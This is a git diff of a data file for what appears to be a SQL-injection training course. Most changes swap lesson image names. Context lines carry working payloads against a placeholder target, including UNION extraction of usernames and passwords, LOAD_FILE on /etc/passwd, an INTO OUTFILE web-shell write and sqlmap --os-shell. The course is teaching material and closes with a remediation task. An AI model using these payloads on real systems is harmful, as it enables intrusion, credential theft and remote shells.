@@ -2912,7 +2912,7 @@ curl "http://<target_ip>/api/products?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),
 \`\`\`
 
 *Operative Drill:* Why is a 'Blind' SQL injection more difficult to exploit than an 'Error-Based' one? How does an Qyvora operative use 'Time-Based' delays to extract data?`,
-              image: 'step-01.png',
+              image: 'step-01.webp',
             },
             {
               title: 'Authentication Bypass & Credential Theft',
@@ -2959,8 +2959,8 @@ curl "http://<target_ip>/api/products?id=1 UNION SELECT column_name,NULL FROM in
 curl "http://<target_ip>/api/products?id=1 UNION SELECT username,password FROM users"
 \`\`\`
 
-*Training Task:* You've extracted a hash: \`5f4dcc3b5aa765d61d8327deb882cf99\`. Use the terminal to identify the hashing algorithm (MD5, SHA1, etc.) and attempt to crack it using an online database or \`hashcat\`.`,
-              image: null,
+*Training Task:* You've extracted a hash: `5f4dcc3b5aa765d61d8327deb882cf99`. Use the terminal to identify the hashing algorithm (MD5, SHA1, etc.) and attempt to crack it using an online database or `hashcat`.`,
+              image: 'step-02.webp',
             },
             {
               title: 'UNION-Based Data Exfiltration',
@@ -3010,8 +3010,8 @@ In high-privilege scenarios, the database can read local files.
 curl "http://<target_ip>/api/products?id=1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL"
 \`\`\`
 
-*Operative Insight:* Always check if you can write files too! \`SELECT ... INTO OUTFILE '/var/www/html/shell.php'\` is how an Qyvora operative turns a SQL injection into a full web shell.`,
-              image: null,
+*Operative Insight:* Always check if you can write files too! `SELECT ... INTO OUTFILE '/var/www/html/shell.php'` is how an Qyvora operative turns a SQL injection into a full web shell.`,
+              image: 'step-03.webp',
             },
             {
               title: 'Automation & Precision: Sqlmap Mastery',
@@ -3059,7 +3059,7 @@ sqlmap -u "http://<target_ip>/api/products?id=1" --os-shell
 \`\`\`
 
 *Final Training Project:* Perform a full audit of the Qyvora target app. Document the vulnerable parameter, the database version, and extract the admin hash. Then, write a one-paragraph 'Remediation Guide' for the developers, explaining how to use **Parameterized Queries** to kill this bug forever.`,
-              image: null,
+              image: 'step-04.webp',
             },
           ],
         },
